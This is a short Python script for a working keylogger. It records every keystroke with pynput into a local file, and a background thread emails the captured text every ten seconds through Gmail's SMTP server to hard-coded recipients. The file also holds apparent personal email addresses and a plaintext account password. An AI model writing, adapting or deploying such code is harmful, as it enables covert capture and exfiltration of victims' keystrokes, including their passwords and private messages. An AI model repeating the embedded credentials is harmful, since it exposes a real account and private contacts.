from threading import Timer, Thread

from pynput.keyboard import Key, Listener

import time

import smtplib


# method to send email

def sendemail(from_addr, to_addr_list, cc_addr_list, subject, message, login, password,
              smtpserver='smtp.gmail.com:587'):
    header = 'From: %s\n' % from_addr

    header += 'To: %s\n' % ','.join(to_addr_list)

    header += 'Cc: %s\n' % ','.join(cc_addr_list)

    header += 'Subject: %s\n' % subject

    message = header + message

    server = smtplib.SMTP(smtpserver)

    server.starttls()

    server.login(login, password)

    problems = server.sendmail(from_addr, to_addr_list, message)
    print("Mail Sent!!!")

    server.quit()


# when a key is pressed

def on_press(key):
    f = open('json.txt', 'a')

    f.write(str(key))

    f.close()


# this is the main loop that sends the email on a fixed interval

def printit():
    while True:
        time.sleep(10.0)  # send email after every 10 seconds

        f = open('json.txt', 'r+')

        msg = f.read()

        f.truncate(0)
        b = 'rohitchobhe8@gmail.com'
        a = ['sagade@mitaoe.ac.in', 'rohitchobhe8@gmail.com']
        sendemail(from_addr=b, to_addr_list=a, cc_addr_list=a, subject='Update', message='\n' + msg,
                  login='rohitchobhe8@gmail.com', password='rkcfamily20')

        # print('Sent') #Used for debugging purpose

        f.close()


t = Thread(target=printit)

t.start()

with Listener(on_press=on_press) as listener:
    listener.join()

t.join()
